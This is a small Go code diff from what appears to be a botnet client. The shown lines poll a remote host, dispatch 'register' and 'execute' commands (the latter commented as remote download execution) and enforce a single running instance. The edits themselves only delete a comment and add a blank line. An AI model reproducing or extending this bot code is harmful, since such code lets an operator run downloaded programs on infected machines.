@@ -111,7 +111,6 @@ func send_poll_request(host string) BotState {
 
 	switch reply.Cmd {
 	case "register":
-		// Collect bot info
 		do_register_bot(reply, host)
 	case "execute":
 		// Remote download execution
@@ -189,6 +188,7 @@ func handle_command() {
 }
 
 func Run() {
+
 	// Check singleton
 	if is_already_exist(botcore.mutex_name) {
 		os.Exit(0)
